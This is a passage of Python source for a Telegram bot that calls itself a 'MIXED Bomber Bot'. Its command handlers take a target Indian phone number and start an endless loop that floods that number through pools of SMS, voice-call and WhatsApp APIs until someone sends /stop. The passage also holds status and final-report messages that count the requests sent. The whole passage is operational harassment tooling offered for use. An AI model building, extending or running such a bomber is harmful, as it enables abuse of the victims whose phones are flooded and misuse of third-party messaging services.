        f"⏱️ <b>Ran For:</b> {elapsed}s\n\n"
        f"📊 <b>Total Requests:</b> <code>{total}</code>\n"
        f"✅ <b>Success:</b> <code>{success}</code>\n"
        f"❌ <b>Failed:</b> <code>{failed}</code>\n"
        f"🔁 <b>Cycles:</b> <code>{cycle}</code>\n"
        f"📡 <b>APIs Used:</b> <code>{total_pool}</code>\n\n"
        f"⚡ <b>Avg Speed:</b> <code>{round(total/max(elapsed,1), 1)} req/s</code>"
    )

    try:
        bot.send_message(chat_id, report)
    except Exception as e:
        log.error(f"Final report send fail: {e}")

    log.info(f"[🔥 BOMB END] chat={chat_id} total={total} ok={success} fail={failed}")
    active_bombs.pop(chat_id, None)


# ============================================================
# 🎛️ TELEGRAM HANDLERS
# ============================================================

def is_admin(uid):
    return uid in ADMIN_IDS


@bot.message_handler(commands=["start", "help"])
def cmd_start(msg):
    txt = (
        f"👋 <b>Welcome {msg.from_user.first_name}!</b>\n\n"
        "🔥 <b>MIXED Bomber Bot</b> — ♾️ Infinite Mode\n"
        "📩 SMS + 📞 Call + 💬 WhatsApp — sab mixed!\n\n"
        "📌 <b>Commands:</b>\n"
        "• /bomb &lt;number&gt; — 🔥 <b>MIXED</b> (SMS+Call+WA)\n"
        "• /sms &lt;number&gt; — SMS only\n"
        "• /call &lt;number&gt; — Voice call only\n"
        "• /wa &lt;number&gt; — WhatsApp only\n"
        "• /stop — Rok do bomb\n"
        "• /status — Live status\n"
        "• /apis — API count\n"
        "• /stats — Bot stats (admin)\n\n"
        "♻️ <b>Bomb infinite loop mein chalega — APIs har cycle repeat hongi!</b>\n"
        "🛑 <i>Sirf /stop se rukega</i>\n\n"
        "⚠️ <i>Admin&owner - @error_404kng (ASIF).</i>"
    )
    bot.reply_to(msg, txt)


@bot.message_handler(commands=["apis"])
def cmd_apis(msg):
    txt = (
        f"📡 <b>API DATABASE</b>\n\n"
        f"📩 SMS APIs: <code>{len(SMS_POOL)}</code>\n"
        f"📞 Call APIs: <code>{len(CALL_POOL)}</code>\n"
        f"💬 WhatsApp APIs: <code>{len(WA_POOL)}</code>\n"
        f"━━━━━━━━━━━━━━━\n"
        f"🔥 <b>MIXED Total:</b> <code>{len(MIXED_POOL)}</code> APIs\n\n"
        f"<i>Har cycle mein sab APIs random order mein fire hongi</i>"
    )
    bot.reply_to(msg, txt)


@bot.message_handler(commands=["stats"])
def cmd_stats(msg):
    if not is_admin(msg.from_user.id):
        bot.reply_to(msg, "❌ Admin only.")
        return
    txt = (
        f"📊 <b>Bot Stats</b>\n\n"
        f"👥 Active Bombs: <code>{len(active_bombs)}</code>\n"
        f"⚙️ Max Threads: <code>{MAX_THREADS}</code>\n"
        f"♻️ Mode: <b>MIXED + Infinite Loop</b>\n"
        f"📡 Total APIs: <code>{len(MIXED_POOL)}</code>"
    )
    bot.reply_to(msg, txt)


@bot.message_handler(commands=["status"])
def cmd_status(msg):
    state = active_bombs.get(msg.chat.id)
    if not state:
        bot.reply_to(msg, "❌ Koi active bomb nahi hai.")
        return
    txt = (
        f"📊 <b>Bomb Status</b>\n\n"
        f"📱 Target: <code>+91{state['target']}</code>\n"
        f"🎯 Mode: <b>{state['mode'].upper()}</b>\n"
        f"📨 Requests Sent: <code>{state['count']}</code>\n"
        f"🛑 Stop flag: <code>{state['stop']}</code>"
    )
    bot.reply_to(msg, txt)


def validate_phone(arg):
    if not arg:
        return None
    num = "".join(filter(str.isdigit, arg))
    if len(num) == 12 and num.startswith("91"):
        num = num[2:]
    if len(num) == 10:
        return num
    return None


def start_bomb(msg, mode):
    parts = msg.text.split()
    if len(parts) < 2:
        bot.reply_to(msg, f"❌ Usage: <code>/{mode} 9876543210</code>")
        return
    phone = validate_phone(parts[1])
    if not phone:
        bot.reply_to(msg, "❌ Invalid number. 10-digit daal.")
        return
    if msg.chat.id in active_bombs:
        bot.reply_to(msg, "⚠️ Ek bomb chal raha hai. Pehle /stop karo.")
        return

    if mode == "all":
        header = "🔥 <b>MIXED BOMB STARTED!</b>\n\n📩 SMS + 📞 Call + 💬 WhatsApp"
        pool_count = len(MIXED_POOL)
    elif mode == "sms":
        header = "📩 <b>SMS BOMB STARTED</b>"
        pool_count = len(SMS_POOL)
    elif mode == "call":
        header = "📞 <b>CALL BOMB STARTED</b>"
        pool_count = len(CALL_POOL)
    else:
        header = "💬 <b>WHATSAPP BOMB STARTED</b>"
        pool_count = len(WA_POOL)

    txt = (
        f"{header}\n\n"
        f"📱 Target: <code>+91{phone}</code>\n"
        f"📡 APIs: <code>{pool_count}</code>\n"
        f"♻️ Loop: <b>Infinite (random order each cycle)</b>\n\n"
        f"♾️ Chalta rahega jab tak /stop na bhej de\n"
        f"🛑 /stop — Rok do"
    )
    bot.reply_to(msg, txt)

    t = threading.Thread(target=bomb_worker, args=(msg.chat.id, phone, mode), daemon=True)
    t.start()


@bot.message_handler(commands=["bomb"])
def cmd_bomb(msg):
    start_bomb(msg, "all")


@bot.message_handler(commands=["sms"])
def cmd_sms(msg):
    start_bomb(msg, "sms")


@bot.message_handler(commands=["call"])
def cmd_call(msg):
    start_bomb(msg, "call")


@bot.message_handler(commands=["wa", "whatsapp"])
def cmd_wa(msg):
    start_bomb(msg, "whatsapp")


@bot.message_handler(commands=["stop"])
def cmd_stop(msg):
    state = active_bombs.get(msg.chat.id)
    if not state:
        bot.reply_to(msg, "❌ Koi active bomb nahi hai.")
        return
    state["stop"] = True
    bot.reply_to(msg, "🛑 <b>Stopping bomb...</b>\n\n<i>Final report aa jayegi.</i>")


@bot.message_handler(func=lambda m: True)
def fallback(msg):
    bot.reply_to(msg, "❓ Unknown command. /help dekho.")


# ============================================================
# 🚀 MAIN
# ============================================================

if __name__ == "__main__":
    log.info(f"🚀 MIXED Bot starting...")
    log.info(f"   SMS: {len(SMS_POOL)} | Call: {len(CALL_POOL)} | WA: {len(WA_POOL)} | MIXED: {len(MIXED_POOL)}")
    try:
        bot.infinity_polling(timeout=30, long_polling_timeout=25)
    except KeyboardInterrupt:
        log.info("🛑 Bot stopped.")
        sys.exit(0)